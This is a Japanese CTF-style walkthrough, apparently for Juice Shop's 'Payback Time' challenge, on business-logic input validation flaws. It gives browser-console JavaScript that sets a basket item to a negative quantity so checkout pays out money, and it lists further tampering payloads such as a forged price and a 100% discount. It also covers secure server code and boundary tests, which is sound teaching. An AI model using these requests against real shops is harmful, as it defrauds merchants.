# Payback Time ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** 入力検証 / ビジネスロジック脆弱性
**目標:** 商品の数量を負の値にして、お金をもらう

---

## 背景知識

### 入力検証の不備とは

入力検証の不備は、**ユーザーからの入力を適切にチェックせずに処理してしまう脆弱性**。特にビジネスロジックに関わる値（数量、金額、割引率など）の検証が不十分だと、深刻な被害につながる。

```
┌─────────────────────────────────────────────────────────────────┐
│                     正常な購入フロー                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ユーザー                                 サーバー              │
│      │                                        │                │
│      │  カートに追加: 商品A × 2個             │                │
│      │ ─────────────────────────────────────▶ │                │
│      │                                        │                │
│      │               価格: ¥1,000 × 2 = ¥2,000               │
│      │                                        │                │
│      │  お支払い: ¥2,000                      │                │
│      │ ◀───────────────────────────────────── │                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                     負の数量攻撃                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻撃者                                サーバー                 │
│      │                                    │                    │
│      │  カートに追加: 商品A × -100個      │                    │
│      │ ─────────────────────────────────▶ │                    │
│      │                                    │                    │
│      │          価格: ¥1,000 × -100 = -¥100,000 😱            │
│      │          合計金額がマイナス！                            │
│      │                                    │                    │
│      │  お支払い: -¥100,000（返金される）  │                    │
│      │ ◀───────────────────────────────── │                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

スーパーのセルフレジを想像してください:

- **正しい仕組み**: 数量は 1 以上しか入力できない
- **脆弱な仕組み**: 数量に -10 と入力したら、レジが 10個分のお金を返してくる

実際のレジでは物理的に不可能ですが、オンラインシステムでは「負の数」という概念が存在するため、適切な検証がないと問題になります。

### なぜ起こるのか

```
┌─────────────────────────────────────────────────────────────────┐
│                     検証の階層                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【フロントエンド】                                              │
│  ┌────────────────────────────────────────┐                    │
│  │ <input type="number" min="1" max="99"> │ ← 簡単にバイパス   │
│  │ 「1以上の数値のみ」とUI制限             │   可能！          │
│  └────────────────────────────────────────┘                    │
│                   │                                             │
│                   ▼                                             │
│  【バックエンド】                                                │
│  ┌────────────────────────────────────────┐                    │
│  │ if (quantity) { ... }                  │ ← 検証なし！       │
│  │ // 型チェックのみ、範囲チェックなし      │                    │
│  └────────────────────────────────────────┘                    │
│                                                                 │
│  → フロントエンドの検証だけに頼っている                          │
│  → APIを直接叩けばバイパス可能                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 思考プロセス

### ステップ1: 入力可能な箇所を探す

```
「ECサイトで数値を入力する場所はどこ？」
    ↓
「カートの数量、クーポンコード、住所の郵便番号...」
    ↓
「数量は金額に直結する → 最も影響が大きい」
    ↓
「数量フィールドに注目しよう」
```

### ステップ2: フロントエンドの検証を確認

```
「画面上では 1, 2, 3... と正の整数しか選べない」
    ↓
「+/- ボタンでの操作、最小値は 1」
    ↓
「でも、これはフロントエンドの制限だけ？」
    ↓
「APIに直接リクエストを送ったらどうなる？」
```

### ステップ3: API リクエストを分析

```
「DevTools → Network で数量変更時のリクエストを観察」
    ↓
「PUT /api/BasketItems/{id}」
「Body: { quantity: 2 }」
    ↓
「これを { quantity: -100 } にしてみよう」
```

### ステップ4: 境界値テスト

```
「負の数: -1, -100, -999999」
「ゼロ: 0」
「小数: 1.5, 0.01」
「巨大数: 999999999」
「特殊値: null, undefined, NaN」
    ↓
「-100 で試すと... 受け入れられた！」
```

---

## 実行手順

### Step 1: ログインして商品をカートに追加

1. 任意のユーザーでログイン
2. 適当な商品（例: Apple Juice）をカートに追加

### Step 2: BasketItem ID を取得

```javascript
// Console で実行
const basket = await fetch('/rest/basket/' + sessionStorage.getItem('bid'), {
  headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
}).then(r => r.json());

console.log('カート内容:', basket.data.Products);
// Products[0].BasketItem.id を確認
const basketItemId = basket.data.Products[0].BasketItem.id;
console.log('BasketItem ID:', basketItemId);
```

### Step 3: 数量を負の値に変更

```javascript
// 数量を -100 に変更
const result = await fetch('/api/BasketItems/' + basketItemId, {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({ quantity: -100 })
}).then(r => r.json());

console.log('更新結果:', result);
```

### Step 4: カートを確認

```javascript
// カートを再取得
const updatedBasket = await fetch('/rest/basket/' + sessionStorage.getItem('bid'), {
  headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
}).then(r => r.json());

// 合計金額を計算
let total = 0;
updatedBasket.data.Products.forEach(p => {
  const subtotal = p.price * p.BasketItem.quantity;
  console.log(`${p.name}: ¥${p.price} × ${p.BasketItem.quantity} = ¥${subtotal}`);
  total += subtotal;
});
console.log(`合計: ¥${total}`);  // マイナスになる！
```

### Step 5: チェックアウト

`/#/basket` でカートを確認すると、合計金額がマイナス表示になっている。チェックアウトを完了すると、「返金」される形になる。

---

## 攻撃の計算例

```
┌─────────────────────────────────────────────────────────────────┐
│                     金額計算の例                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【正常な購入】                                                  │
│  Apple Juice: ¥1.99 × 2 = ¥3.98                                │
│  Banana Juice: ¥1.99 × 1 = ¥1.99                               │
│  ───────────────────────────                                    │
│  合計: ¥5.97                                                    │
│                                                                 │
│  【負の数量攻撃】                                                │
│  Apple Juice: ¥1.99 × -500 = -¥995.00                          │
│  Banana Juice: ¥1.99 × 1 = ¥1.99                               │
│  ───────────────────────────                                    │
│  合計: -¥993.01 😱                                              │
│                                                                 │
│  → 「¥993.01 の返金」として処理される可能性                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 脆弱なコードパターン

```javascript
// ❌ 脆弱なコード
app.put('/api/BasketItems/:id', async (req, res) => {
  const { quantity } = req.body;

  // 型チェックのみ（範囲チェックなし）
  if (typeof quantity !== 'number') {
    return res.status(400).send('Invalid quantity');
  }

  // 負の値でもそのまま保存
  await BasketItem.update({ quantity }, {
    where: { id: req.params.id }
  });

  res.json({ status: 'success' });
});
```

### 問題点

1. **範囲チェックなし**: 負の値や極端に大きい値を許容
2. **ビジネスロジック無視**: 数量は 1 以上であるべき
3. **フロントエンド依存**: UIの制限だけに頼っている

---

## 安全な実装

```javascript
// ✅ 安全なコード
app.put('/api/BasketItems/:id', async (req, res) => {
  const { quantity } = req.body;

  // 1. 型チェック
  if (typeof quantity !== 'number' || !Number.isInteger(quantity)) {
    return res.status(400).json({ error: 'Quantity must be an integer' });
  }

  // 2. 範囲チェック（ビジネスルール）
  const MIN_QUANTITY = 1;
  const MAX_QUANTITY = 100;

  if (quantity < MIN_QUANTITY) {
    return res.status(400).json({ error: `Quantity must be at least ${MIN_QUANTITY}` });
  }

  if (quantity > MAX_QUANTITY) {
    return res.status(400).json({ error: `Quantity cannot exceed ${MAX_QUANTITY}` });
  }

  // 3. 所有者チェック（IDOR対策）
  const item = await BasketItem.findByPk(req.params.id);
  if (!item || item.BasketId !== req.user.basketId) {
    return res.status(403).json({ error: 'Access denied' });
  }

  // 4. 更新
  await item.update({ quantity });
  res.json({ status: 'success' });
});
```

### データベースレベルの制約

```sql
-- テーブル定義で制約を追加
CREATE TABLE basket_items (
  id INTEGER PRIMARY KEY,
  basket_id INTEGER,
  product_id INTEGER,
  quantity INTEGER CHECK (quantity >= 1 AND quantity <= 100)  -- 範囲制約
);
```

---

## 他の入力検証バイパスパターン

### 価格の直接指定

```javascript
// 攻撃
{ "productId": 1, "price": 0.01 }
// → 本来 $9.99 の商品を $0.01 で購入
```

### 割引率の操作

```javascript
// 攻撃
{ "discountPercent": 100 }
// → 100%オフで購入
```

### 小数による端数攻撃

```javascript
// 攻撃
{ "quantity": 0.001 }
// → 端数処理の不備を突く
```

### 型変換の悪用

```javascript
// 攻撃
{ "quantity": "10e10" }  // 科学記法
{ "quantity": "0x100" }  // 16進数
// → 意図しない大きな値に変換される可能性
```

---

## テストすべき境界値

| 値 | 期待される動作 |
|----|---------------|
| `-1` | 拒否 |
| `0` | 拒否（または削除として処理） |
| `0.5` | 拒否（整数のみ許可すべき） |
| `1` | 許可 |
| `100` | 許可 |
| `101` | 拒否（上限超過） |
| `999999999` | 拒否 |
| `null` | 拒否 |
| `"1"` | 許可（または拒否、仕様による） |
| `[]` | 拒否 |

---

## 関連チャレンジ

- [Zero Stars](../difficulty-1/zero-stars.md) - 評価値の検証バイパス
- [Forged Feedback](forged-feedback.md) - パラメータ改ざん
- [Deluxe Fraud](deluxe-fraud.md) - 支払いロジックのバイパス

## 参考リンク

- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [OWASP Testing Guide - Business Logic Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README)
